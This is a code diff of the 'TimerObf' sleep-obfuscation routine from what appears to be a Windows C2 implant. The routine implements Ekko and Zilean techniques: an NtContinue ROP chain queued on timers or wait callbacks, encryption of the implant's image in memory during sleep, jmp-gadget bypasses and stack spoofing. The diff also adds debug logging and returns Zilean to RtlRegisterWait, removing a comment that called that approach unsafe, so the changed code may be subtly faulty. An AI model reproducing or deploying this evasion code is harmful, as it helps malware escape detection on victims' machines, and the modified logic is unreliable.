@@ -12,23 +12,6 @@
 
 #if _WIN64
 
-/*!
- * @brief
- *  ekko/zilean sleep obfuscation technique using
- *  Timers Api (RtlCreateTimer/RtlRegisterWait)
- *  with stack duplication/spoofing by duplicating the
- *  NT_TIB from another thread.
- *
- * @note
- *  this technique most likely wont work when the
- *  process is also actively using the timers api.
- *  So in future either use Veh + hardware breakpoints
- *  to create our own thread pool or leave it as it is.
- *
- * @param TimeOut
- * @param Method
- * @return
- */
 BOOL TimerObf(
     _In_ ULONG TimeOut,
     _In_ ULONG Method
@@ -40,6 +23,7 @@ BOOL TimerObf(
     HANDLE   EvntStart = { 0 };
     HANDLE   EvntTimer = { 0 };
     HANDLE   EvntDelay = { 0 };
+    HANDLE   EvntWait  = { 0 };
     UCHAR    Buf[ 16 ] = { 0 };
     USTRING  Key       = { 0 };
     USTRING  Img       = { 0 };
@@ -69,10 +53,20 @@ BOOL TimerObf(
     Protect   = PAGE_EXECUTE_READWRITE;
     JmpBypass = Instance->Config.Implant.SleepJmpBypass;
 
+    PRINTF( "TimerObf: ENTRY TimeOut=%lu Method=%lu (%s) JmpBypass=%d StackSpoof=%d ImageBase=%p ImageSize=%llu\n",
+            TimeOut, Method,
+            Method == SLEEPOBF_EKKO ? "EKKO" : Method == SLEEPOBF_ZILEAN ? "ZILEAN" : "?",
+            JmpBypass, Instance->Config.Implant.StackSpoof,
+            ImageBase, (unsigned long long) ImageSize )
+
     if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
         TxtBase = Instance->Session.TxtBase;
         TxtSize = Instance->Session.TxtSize;
         Protect = PAGE_EXECUTE_READ;
+        PRINTF( "TimerObf: using .text section TxtBase=%p TxtSize=%llu Protect=PAGE_EXECUTE_READ\n",
+                TxtBase, (unsigned long long) TxtSize )
+    } else {
+        PUTS( "TimerObf: using full image (no .text section info)" )
     }
 
     /* create a random key */
@@ -91,10 +85,13 @@ BOOL TimerObf(
     Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
     Img.Length = Img.MaximumLength = ImgSize = Instance->Session.ModuleSize;
 
-    /* Both Ekko and Zilean now use a timer queue for the ROP chain.
-     * Zilean originally used RtlRegisterWait but that does NOT guarantee
-     * all callbacks run on the same wait thread, making NtContinue unsafe. */
-    NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
+    if ( Method == SLEEPOBF_EKKO ) {
+        NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
+        PRINTF( "TimerObf: RtlCreateTimerQueue NtStatus=%lx Queue=%p\n", NtStatus, Queue )
+    } else if ( Method == SLEEPOBF_ZILEAN ) {
+        NtStatus = Instance->Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
+        PRINTF( "TimerObf: NtCreateEvent (EvntWait) NtStatus=%lx EvntWait=%p\n", NtStatus, EvntWait )
+    }
 
     if ( NT_SUCCESS( NtStatus ) )
     {
@@ -103,13 +100,21 @@ BOOL TimerObf(
              NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
              NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
         {
-            /* get the context of the timer thread */
-            NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
+            /* get the context of the Timer thread based on the method used */
+            if ( Method == SLEEPOBF_EKKO ) {
+                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
+            } else if ( Method == SLEEPOBF_ZILEAN ) {
+                NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+            }
 
             if ( NT_SUCCESS( NtStatus ) )
             {
-                /* Send event that we got the context of the timer thread */
-                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
+                /* Send event that we got the context of the timers thread */
+                if ( Method == SLEEPOBF_EKKO ) {
+                    NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
+                } else if ( Method == SLEEPOBF_ZILEAN ) {
+                    NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+                }
 
                 if ( NT_SUCCESS( NtStatus ) )
                 {
@@ -141,6 +146,7 @@ BOOL TimerObf(
                     /* search for jmp instruction */
                     if ( JmpBypass )
                     {
+                        PRINTF( "TimerObf: searching gadget JmpBypass=%d\n", JmpBypass )
                         /* change padding to "jmp rbx" */
                         if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                             JmpPad[ 1 ] = 0x23;
@@ -153,7 +159,10 @@ BOOL TimerObf(
                             JmpPad,
                             sizeof( JmpPad )
                         ) ) ) {
+                            PUTS( "TimerObf: gadget NOT FOUND, downgrading to JMPRAX_NONE" )
                             JmpBypass = SLEEPOBF_BYPASS_NONE;
+                        } else {
+                            PRINTF( "TimerObf: gadget found at %p\n", JmpGadget )
                         }
                     }
 
@@ -246,43 +255,53 @@ BOOL TimerObf(
                     Inc++;
 
                     /* End of Ropchain */
+                    Rop[ Inc ].Rip = U_PTR( Instance->Win32.NtSetEvent );
                     OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                     Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                     Rop[ Inc ].Rdx = U_PTR( NULL );
                     Inc++;
 
-                    PRINTF( "Rops to be executed: %d\n", Inc )
+                    PRINTF( "TimerObf: Rops to be executed: %d (TimeOut=%lu Delay base=%lu)\n", Inc, TimeOut, Delay )
 
-                    /* execute/queue the timers — both Ekko and Zilean now use
-                     * a timer queue with WT_EXECUTEINTIMERTHREAD to guarantee
-                     * all NtContinue callbacks run on the same thread. */
+                    /* execute/queue the timers */
                     for ( int i = 0; i < Inc; i++ ) {
-                        if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
-                            PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
-                            goto LEAVE;
+                        if ( Method == SLEEPOBF_EKKO ) {
+                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+                                PRINTF( "TimerObf: RtlCreateTimer[%d] Failed: %lx\n", i, NtStatus )
+                                goto LEAVE;
+                            }
+                        } else if ( Method == SLEEPOBF_ZILEAN ) {
+                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+                                PRINTF( "TimerObf: RtlRegisterWait[%d] Failed: %lx\n", i, NtStatus )
+                                goto LEAVE;
+                            }
                         }
                     }
+                    PUTS( "TimerObf: all ROPs queued, signaling EvntStart and waiting for EvntDelay" )
 
                     /* just wait for the sleep to end */
                     if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
-                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
+                        PRINTF( "TimerObf: NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
+                    } else {
+                        PUTS( "TimerObf: sleep cycle completed, EvntDelay signaled" )
                     }
                 } else {
-                    PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
+                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                 }
             } else {
-                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
+                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
             }
         } else {
             PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
         }
     } else {
-        PRINTF( "RtlCreateTimerQueue Failed: %lx\n", NtStatus )
+        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
     }
 
 LEAVE: /* cleanup */
+    PUTS( "TimerObf: cleanup begin" )
     if ( Queue ) {
-        Instance->Win32.RtlDeleteTimerQueueEx( Queue, INVALID_HANDLE_VALUE );
+        Instance->Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
     }
 
@@ -301,6 +320,11 @@ LEAVE: /* cleanup */
         EvntDelay = NULL;
     }
 
+    if ( EvntWait ) {
+        SysNtClose( EvntWait );
+        EvntWait = NULL;
+    }
+
     if ( ThdSrc ) {
         SysNtClose( ThdSrc );
         ThdSrc = NULL;
@@ -314,6 +338,7 @@ LEAVE: /* cleanup */
     /* clear key from memory */
     RtlSecureZeroMemory( Buf, sizeof( Buf ) );
 
+    PRINTF( "TimerObf: EXIT Success=%d\n", Success )
     return Success;
 }
 
